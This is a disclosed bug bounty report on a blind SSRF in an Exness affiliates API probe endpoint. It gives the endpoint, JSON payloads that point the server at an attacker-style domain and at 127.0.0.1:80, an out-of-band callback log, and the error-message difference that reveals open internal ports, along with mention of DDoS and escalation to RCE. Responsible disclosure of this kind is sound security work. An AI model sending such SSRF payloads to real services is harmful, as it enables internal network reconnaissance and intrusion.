# Blind SSRF on https://my.exnessaffiliates.com/ allows for internal network enumeration

## Report Details
- **Report ID**: 1832494
- **URL**: https://hackerone.com/reports/1832494
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-01-12T13:49:27.283Z
- **Disclosed**: 2023-10-25T13:09:58.717Z

## Reporter
- **Username**: null_hypothesis
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: exness

## Vulnerability Information
## Summary:
Hi
Hope you're well
I have found a Blind SSRF vulnerability, in an endpoint on exnessaffiliates.com endpoint, which would allow for Internal network enumeration.

The endpoint in question is 
`https://my.exnessaffiliates.com/api/partner_integrations/template/probe`

When an attacker makes a POST request, with the post data:
```
{"data":{"url":"https://attacker-domain.tld"}}
```

We can see a DNS and HTTP request being made as so:
```
GET / HTTP/1.1
Host: sa66ovrblrbiviochnojtli2bthk5ft4.oastify.com
sentry-trace: xxx,baggage: sentry-trace_id=xxx,sentry-environment=production,sentry-public_key=xxx,sentry-transaction=/api/v1/partners/%7Bpartner_partner_uid%7D/integrations/
User-Agent: python-requests/2.28.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
uber-trace-id: xxx
```

This is itself, would constitute a minor Blind SSRF vulnerability, if it is not intentionally accepted.

However, if we use the post data:
```
{"data":{"url":"https://127.0.0.1:80"}}
```

Normally, if the port/host is not reachable, it will return a simple error:
```
"code":"ValidationError","message":"Invalid input.","details":[{"field":"url","message":"Invalid Postback URL","code":"invalid"}]
```

However, if the port is open, Python Requests is returning the error message to the user as so:
{F2117769}

This indicates that the HTTP port 80 on 127.0.0.1 is open.

With permission, I will further this attack to inspect the internal network.


## Steps to Reproduce:
[Add details for how we can reproduce the issue. Please ensure reproducibility of the issue.]

  1. Make a POST request to https://my.exnessaffiliates.com/api/partner_integrations/template/probe/
       with the post data 
      {"data":{"url":"https://127.0.0.1:80"}}


## Impact
How does the issue affect the business or the user? 
Internal network details are disclosed.

What can the attacker get through the issue? 
Internal network device enumeration
Utilise the requests for DDOS on a victim's server.


Can the issue be escalated further? If so, how? 
Potentially, I will attempt further escalation with permission.

## Mitigation
Do not return Python errors to the user - even when URL contains blacklisted contents.


## Supporting Material/References:
attached above.

## Impact

Currently, this will allow for network enumeration from the internal IP:
███████
With permission, I will attempt to escalate this issue to inspect the internal network further, and attempt RCE.

## Attachments
- image.png
